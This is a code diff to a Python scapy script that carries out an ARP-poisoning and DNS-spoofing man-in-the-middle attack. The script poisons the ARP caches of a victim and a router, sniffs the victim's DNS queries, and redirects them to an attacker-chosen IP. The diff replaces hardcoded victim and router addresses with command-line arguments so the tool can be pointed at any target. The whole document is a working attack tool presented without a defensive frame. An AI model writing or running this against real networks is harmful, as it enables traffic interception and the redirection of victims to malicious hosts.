@@ -4,12 +4,18 @@ import subprocess, os, re
 import threading
 import signal
 from scapy.all import *
+import argparse
 
-domain = "google.ca"
-victimIP = "192.168.0.16"
-routerIP = "192.168.0.100"
-interface = "eno1"
-redirectIP = "192.168.0.17"
+
+redirectIP = ""
+
+def parse_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-v", "--victim", help="IP address of victim", required=True)
+    parser.add_argument("-l", "--local", help="IP address of the local machine. Specify this one if there is no directed IP. Cannot be specified at the same time with --redirect")
+    parser.add_argument("-r", "--router", help="IP address of router", required=True)
+    parser.add_argument("-re", "--redirect", help="IP address of where victim will be directed to. ")
+    return parser.parse_args()
 
 def checkRootPrivilege():
     if os.geteuid() != 0:
@@ -38,7 +44,7 @@ def getLocalMAC(interface):
     return mac[:17]
 
 def getTargetMAC(IP):
-    ans, unans = arping(IP)
+    ans, unans = arping(IP, verbose=0)
     for s,r in ans:
         return r[Ether].src
 
@@ -62,31 +68,41 @@ def listen(victimIP):
     mFilter = "udp and port 53 and src " + victimIP
     sniff(filter=mFilter, prn=parsePacket)
 
-def main():
-    global victimIP
-    global interface
-    global routerIP
-    try:
-        checkRootPrivilege()
-        setup()
+def main(args):
+    global redirectIP
+    checkRootPrivilege()
+    victimIP = str(args.victim)
+    routerIP = str(args.router)
+    victimMAC = getTargetMAC(victimIP)
+    routerMAC = getTargetMAC(routerIP)
+    localIP = args.local
+    redirect = args.redirect
 
-        victimMAC = getTargetMAC(victimIP)
-        localMAC = getLocalMAC(interface)
-        routerMAC = getTargetMAC(routerIP)
+    if localIP is None and redirect is None:
+        sys.exit("Specify either local IP or redirected IP. None is provided.")
+    elif localIP is not None and redirect is not None:
+        sys.exit("Specify either local IP or redirected IP. Cannot accept both.")
+    else:
+        if localIP is not None:
+            redirectIP = str(localIP)
+        elif redirect is not None:
+            redirectIP = str(redirect)
 
-        arpThread = threading.Thread(target=arpPoison, args=(routerIP, victimIP, routerMAC, victimMAC))
-        arpThread.daemon = True
-        listenThread = threading.Thread(target=listen, args=(victimIP,))
-        listenThread.daemon = True
+    setup()
+    arpThread = threading.Thread(target=arpPoison, args=(routerIP, victimIP, routerMAC, victimMAC))
+    arpThread.daemon = True
+    listenThread = threading.Thread(target=listen, args=(victimIP,))
+    listenThread.daemon = True
 
-        arpThread.start()
-        listenThread.start()
+    arpThread.start()
+    listenThread.start()
 
-        arpThread.join()
-        listenThread.join()
-    except KeyboardInterrupt:
-        restore()
-        sys.exit(0)
+    while True:
+        try:
+            time.sleep(5)
+        except KeyboardInterrupt:
+            restore()
+            sys.exit(0)
 
 if __name__ == '__main__':
-    main()
+    main(parse_args())
